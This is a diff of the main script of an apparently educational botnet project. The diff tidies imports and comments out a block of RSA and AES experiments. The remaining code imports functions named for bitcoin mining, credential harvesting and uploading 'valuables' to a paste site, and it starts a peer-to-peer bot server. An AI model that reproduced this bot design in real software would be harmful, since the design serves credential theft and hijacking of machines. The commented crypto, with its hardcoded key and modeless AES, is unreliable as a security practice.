@@ -1,22 +1,11 @@
-import os
 import socket
-import time
 import threading
-import sys
-import struct
-import fractions
-from Crypto.Hash import SHA256
-from Crypto.PublicKey import RSA
-from lib.ScheizerCipher import PrivateKey
-from lib.ScheizerCipher import PublicKey
+import time
 
-from lib.comms import StealthConn
 from lib.evil import bitcoin_mine, harvest_user_pass
-from lib.p2p import find_bot, bot_server
 from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, \
     valuables
-from lib.helpers import read_hex
-from Crypto.Cipher import AES
+from lib.p2p import find_bot, bot_server
 
 
 def p2p_upload(fn):
@@ -105,124 +94,123 @@ def modular_inverse(a, m):
 
 if __name__ == "__main__":
 
-    if False:
-
-
-
-        pastebot_private_key = RSA.importKey(open(os.path.join("pastebot.net", "private.key"), "rb").read())
-        pastebot_public_key = RSA.importKey(open(os.path.join("pastebot.net", "public.key"), "rb").read())
-
-
-
-        f = open(os.path.join("pastebot.net", "hello.signed"), "rb").read()
-
-        lines = f.split(bytes("\n", "ascii"), 1)
-        first_line = int(lines[0])
-
-        print(pastebot_public_key.verify("Caesar".encode(), (first_line, 'x')))
-
-        sys.exit()
-
-        msg = "attack at dawn".encode()
-        emsg = pastebot_private_key.encrypt(msg, 'x')[0]
-        dmsg = pastebot_public_key.decrypt(emsg)
-
-        new_key = RSA.generate(2048)
-
-        new_priv_key = new_key
-        new_pub_key = new_key.publickey()
-
-        assert (msg == dmsg)
-
-        signature = new_priv_key.sign(msg, 'x')
-        assert new_pub_key.verify(msg, signature)
-
-
-        p = 11037271757
-        q = 8736028057
-        e = 6461335109
-
-        assert is_prime(p)
-        assert is_prime(q)
-        assert is_prime(e)
-
-        private_key = PrivateKey(p, q, e)
-        print("Max length : {}".format(private_key.max_length))
-        print("Max bits : {}".format(private_key.max_bits))
-        print("Max bytes : {}".format(private_key.max_bytes))
-
-        assert fractions.gcd(e, private_key.t) == 1
-
-        public_key = private_key.get_public_key()
-
-        msg = 'theology'
-        msg_int = int.from_bytes(msg.encode(), byteorder='big')
-        assert private_key.max_length > msg_int
-        # msg_array = [char for char in msg]
-
-        print("Original message: {}".format(msg))
-        print("Original message length: {}".format(msg_int))
-
-        encrypted = public_key.encrypt(msg_int)
-
-        print("Encrypted data: {}".format(encrypted))
-
-        decrypted = private_key.decrypt(encrypted)
-
-        print("Decrypted message: {}".format(decrypted))
-        print("Decrypted message: {}".format(decrypted.to_bytes(8, byteorder='big')))
-        # assert encrypted ** pr_key % n == msg_int ** (pub_key * pr_key) % n
-        assert msg_int == decrypted
-
-        msg_hash = SHA256.new()
-        msg_hash.update(msg.encode())
-        print(msg_hash.hexdigest())
-        print([char for char in msg_hash.hexdigest()])
-        public_key.encrypt([char for char in msg_hash.hexdigest()])
-        msg_hash_int = int.from_bytes(msg_hash.hexdigest().encode()[:2], byteorder='big')
-        print(msg_hash_int)
-
-        sys.exit()
-
-        encrypted_data = encrypt(899, 17, 65)
-        print("Encrypted data: {}".format(repr(encrypted_data)))
-        private_key = crack_key(899, 17)
-
-        print("Cracked private key: {}".format(repr(private_key)))
-
-        decrypted_data = decrypt(899, 593, 53)
-        print("Decrypted data: {}".format(decrypted_data))
-        sys.exit()
-
-        shared_key = 'askldfjasdgldljsalglsajglasjldsjfoweijfsandblhsaghaiwejgfaldsjglawiejglajglksagllilsigehsgdnbsei'[
-                     :32]
-        cipher = AES.new(shared_key)
-
-        data = 'this is the new shit'
-        print("Original data: {}".format(data))
-        print("Original data length: {}".format(len(data)))
-
-        data = bytes(data, "ascii")
-        length = 16 - (len(data) % 16)
-        data += ' '.encode() * length
-
-        print("Padded data length: {}".format(len(data)))
-
-        encrypted_data = cipher.encrypt(data)
-
-        print("Encrypted data: {}".format(repr(encrypted_data)))
-        print("Sending packet of length {}".format(len(encrypted_data)))
-
-        pkt_len_packed = struct.pack('H', len(encrypted_data))
-
-        unpacked_contents = struct.unpack('H', pkt_len_packed)
-        pkt_len = unpacked_contents[0]
-
-        decrypted_data = cipher.decrypt(encrypted_data)
-        print("Receiving packet of length {}".format(pkt_len))
-        print("Encrypted data: {}".format(repr(encrypted_data)))
-        print("Decrypted data: {}".format(decrypted_data))
-        print("Original data: {}".format(decrypted_data.decode("ascii").rstrip()))
+    # Please ignore this and go about your business in an orderly fashion. Have a nice day!
+    #
+    # if False:
+    #     pastebot_private_key = RSA.importKey(open(os.path.join("pastebot.net", "private.key"), "rb").read())
+    #     pastebot_public_key = RSA.importKey(open(os.path.join("pastebot.net", "public.key"), "rb").read())
+    #
+    #
+    #
+    #     f = open(os.path.join("pastebot.net", "hello.signed"), "rb").read()
+    #
+    #     lines = f.split(bytes("\n", "ascii"), 1)
+    #     first_line = int(lines[0])
+    #
+    #     print(pastebot_public_key.verify("Caesar".encode(), (first_line, 'x')))
+    #
+    #     sys.exit()
+    #
+    #     msg = "attack at dawn".encode()
+    #     emsg = pastebot_private_key.encrypt(msg, 'x')[0]
+    #     dmsg = pastebot_public_key.decrypt(emsg)
+    #
+    #     new_key = RSA.generate(2048)
+    #
+    #     new_priv_key = new_key
+    #     new_pub_key = new_key.publickey()
+    #
+    #     assert (msg == dmsg)
+    #
+    #     signature = new_priv_key.sign(msg, 'x')
+    #     assert new_pub_key.verify(msg, signature)
+    #
+    #
+    #     p = 11037271757
+    #     q = 8736028057
+    #     e = 6461335109
+    #
+    #     assert is_prime(p)
+    #     assert is_prime(q)
+    #     assert is_prime(e)
+    #
+    #     private_key = PrivateKey(p, q, e)
+    #     print("Max length : {}".format(private_key.max_length))
+    #     print("Max bits : {}".format(private_key.max_bits))
+    #     print("Max bytes : {}".format(private_key.max_bytes))
+    #
+    #     assert fractions.gcd(e, private_key.t) == 1
+    #
+    #     public_key = private_key.get_public_key()
+    #
+    #     msg = 'theology'
+    #     msg_int = int.from_bytes(msg.encode(), byteorder='big')
+    #     assert private_key.max_length > msg_int
+    #     # msg_array = [char for char in msg]
+    #
+    #     print("Original message: {}".format(msg))
+    #     print("Original message length: {}".format(msg_int))
+    #
+    #     encrypted = public_key.encrypt(msg_int)
+    #
+    #     print("Encrypted data: {}".format(encrypted))
+    #
+    #     decrypted = private_key.decrypt(encrypted)
+    #
+    #     print("Decrypted message: {}".format(decrypted))
+    #     print("Decrypted message: {}".format(decrypted.to_bytes(8, byteorder='big')))
+    #     # assert encrypted ** pr_key % n == msg_int ** (pub_key * pr_key) % n
+    #     assert msg_int == decrypted
+    #
+    #     msg_hash = SHA256.new()
+    #     msg_hash.update(msg.encode())
+    #     print(msg_hash.hexdigest())
+    #     print([char for char in msg_hash.hexdigest()])
+    #     public_key.encrypt([char for char in msg_hash.hexdigest()])
+    #     msg_hash_int = int.from_bytes(msg_hash.hexdigest().encode()[:2], byteorder='big')
+    #     print(msg_hash_int)
+    #
+    #     sys.exit()
+    #
+    #     encrypted_data = encrypt(899, 17, 65)
+    #     print("Encrypted data: {}".format(repr(encrypted_data)))
+    #     private_key = crack_key(899, 17)
+    #
+    #     print("Cracked private key: {}".format(repr(private_key)))
+    #
+    #     decrypted_data = decrypt(899, 593, 53)
+    #     print("Decrypted data: {}".format(decrypted_data))
+    #     sys.exit()
+    #
+    #     shared_key = 'askldfjasdgldljsalglsajglasjldsjfoweijfsandblhsaghaiwejgfaldsjglawiejglajglksagllilsigehsgdnbsei'[
+    #                  :32]
+    #     cipher = AES.new(shared_key)
+    #
+    #     data = 'this is the new shit'
+    #     print("Original data: {}".format(data))
+    #     print("Original data length: {}".format(len(data)))
+    #
+    #     data = bytes(data, "ascii")
+    #     length = 16 - (len(data) % 16)
+    #     data += ' '.encode() * length
+    #
+    #     print("Padded data length: {}".format(len(data)))
+    #
+    #     encrypted_data = cipher.encrypt(data)
+    #
+    #     print("Encrypted data: {}".format(repr(encrypted_data)))
+    #     print("Sending packet of length {}".format(len(encrypted_data)))
+    #
+    #     pkt_len_packed = struct.pack('H', len(encrypted_data))
+    #
+    #     unpacked_contents = struct.unpack('H', pkt_len_packed)
+    #     pkt_len = unpacked_contents[0]
+    #
+    #     decrypted_data = cipher.decrypt(encrypted_data)
+    #     print("Receiving packet of length {}".format(pkt_len))
+    #     print("Encrypted data: {}".format(repr(encrypted_data)))
+    #     print("Decrypted data: {}".format(decrypted_data))
+    #     print("Original data: {}".format(decrypted_data.decode("ascii").rstrip()))
 
     # Start a new thread to accept P2P echo or P2P upload requests
     thr = threading.Thread(target=bot_server)
